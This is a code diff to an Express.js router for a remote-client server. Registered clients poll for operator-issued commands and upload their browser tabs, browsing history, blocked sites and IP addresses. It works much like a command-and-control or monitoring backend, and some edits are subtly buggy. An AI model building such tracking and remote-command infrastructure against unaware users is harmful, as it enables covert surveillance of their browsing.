@@ -2,15 +2,23 @@ var router = require('express').Router(),
     auth = require('../auth'),
     Client = require('mongoose').model('Client')
 
-commands = []
+function log(msg) {
+    console.log(`[*] Clients: ${msg}`)
+}
+
+var commands = {}
+var id = 0
 
 function validId(req, res, next) {
     Client.findById(req.params.id, (err, client) => {
         if (err) {
-            return res.render('clients/client.html', { err: "Could not find specified client" })
+            Client.find({ }, (err, clients) => {
+                return res.render('clients/index.html', { clients: clients, err: "Could not find specified client" })
+            })
+        } else {
+            req.client = client
+            next()
         }
-        req.client = client
-        next()
     })
 }
 
@@ -43,16 +51,16 @@ router.get('/clients/stats', auth.user, (req, res, next) => {
 
 router.get('/clients/connect', (req, res, next) => {
     client = new Client()
-    client.isOnline = true
     client.save((err, client) => {
         if (err) { return next(err) }
-        commands[client.id] = {}
+        log(`New client connected`)
+        commands[client.id] = []
         res.send(client.id)
     })
 })
 
 router.get('/clients/:id', auth.user, validId, (req, res) => {
-    res.render('clients/client.html', { _client: req.client })
+    res.render('clients/client.html', { _client: req.client, commands: commands[req.client.id] })
 })
 
 router.post('/clients/:id/editInfo', auth.user, validId, (req, res) => {
@@ -62,21 +70,34 @@ router.post('/clients/:id/editInfo', auth.user, validId, (req, res) => {
     }, err => {
         if (err) { return next(err) }
         if (req.body.name) {
+            log(`${req.client.id}: Name and note modified`)
             res.render('clients/client.html', {
-                _client: req.client, msg: req.body.note ? "Success! Name changed and note added." : "Success! Name changd and note cleared."
+                _client: req.client,
+                commands: commands[req.client.id],
+                msg: req.body.note ? "Success! Name changed and note added." : "Success! Name changed and note cleared."
             })
         } else {
+            log(`${req.client.id}: Note modified`)
             res.render('clients/client.html', {
-                _client: req.client, msg: req.body.note ? "Success! Note added." : "Success! Note cleared."
+                _client: req.client,
+                commands: commands[req.client.id],
+                msg: req.body.note ? "Success! Note added." : "Success! Note cleared."
             })
         }
     })
 })
 
+router.get('/clients/:id/connect', validId, (req, res) => {
+    log(`${req.client.id}: Client reconnected`)
+    commands[req.client.id] = []
+    res.sendStatus(200)
+})
+
 router.get('/clients/:id/disconnect', (req, res) => {
-    Client.findByIdAndRemove(req.params.id, err => {
+    Client.findByIdAndRemove(req.params.id, (err, client) => {
         if (err) { return next(err) }
-        res.send("k bye")
+        log(`${client.id}: Client disconnected`)
+        res.sendStatus(200)
     })
 })
 
@@ -85,38 +106,42 @@ router.get('/clients/:id/bulletin', validId, (req, res) => {
 })
 
 router.post('/clients/:id/bulletin', auth.user, validId, (req, res) => {
-    if (req.body.code) {
+    var data = JSON.parse(req.body.data)
+    if (data.code) {
+        log(`${req.client.id}: Command posted`)
         commands[req.client.id].push({
-            code: req.body.code,
-            args: req.body.args
+            id: id++,
+            code: data.code,
+            args: data.args
         })
-        res.render('clients/client.html', { _client: req.client, msg: "Command issued" })
+        res.sendStatus(200)
     } else {
-        res.render('clients/client.html', { err: "Invalid command code" })
+        res.sendStatus(400)
     }
 })
 
-router.post('/clients/:id/respond', validId, (req, res) => {
-    var results = req.body.results
-    for (var i = 0; i < results.length; i++) {
-        if (results[i].success) {
-            delete commands[req.client.id][i]
+router.post('/clients/:id/bulletin/respond', validId, (req, res) => {
+    var result = JSON.parse(req.body.result)
+    for (var i = 0; i < commands[req.client.id].length; i++) {
+        if (commands[req.client.id][i].id === result.id) {
+            commands.splice(i, 1)
+            break
         }
     }
-    commands[req.client.id] = commands[req.client.id].filter(el => {
-        return el
-    })
+    log(`${req.client.id}: Command consumed, ${result.success}`)
+    res.sendStatus(200);
 })
 
-router.post('/clients/:id/update', (req, res) => {
-    var data = JSON.parse(req.body.data)
-    Client.findByIdAndUpdate(req.params.id, {
-         blocks: data.blocks,
-         tabs: data.tabs,
-         history: data.history,
-         ips: data.ips
+router.post('/clients/:id/update', validId, (req, res) => {
+    var body = JSON.parse(req.body.data)
+    Client.findByIdAndUpdate(req.client.id, {
+         blocks: body.blocks,
+         tabs: body.tabs,
+         history: body.history,
+         ips: body.ips
     }, err => {
         if (err) { return next(err) }
+        log(`${req.client.id}: Information updated`)
         res.send("Updated")
     })
 })
